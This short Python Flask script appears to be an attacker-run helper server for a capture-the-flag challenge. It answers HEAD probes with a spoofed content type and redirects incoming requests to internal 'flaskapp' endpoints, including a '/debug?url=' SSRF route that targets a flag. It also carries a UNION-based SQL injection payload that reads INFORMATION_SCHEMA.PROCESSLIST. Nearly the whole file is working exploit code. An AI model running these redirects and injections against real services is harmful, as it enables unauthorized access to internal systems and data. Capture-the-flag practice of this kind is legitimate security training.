from flask import Flask, Response, request, redirect

query = "%' UNION select INFO,1 from INFORMATION_SCHEMA.PROCESSLIST -- "
url = r" http://localhost:5000/flag?plisbisa=bebas"


app = Flask(__name__)

CHALLENGE_URL = "http://localhost:3000/"


@app.route("/")
@app.route("/log")
def catch():
    app.logger.info(f"Path: {request.path}")
    if request.method == "HEAD":
        resp = Response("")
        resp.headers["Content-Type"] = "text/x-component"
        return resp
    # return redirect("http://flaskapp:5000/flag")  # testing
    return redirect("http://flaskapp:5000/debug?url=" + url)
    # return redirect("http://flaskapp:5000/users?username=" + query)


@app.route("/<path:path>")
def catch2(path):
    app.logger.info(f"redirecting to chall: {path}")
    return redirect(CHALLENGE_URL + path)


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=1337, debug=True)
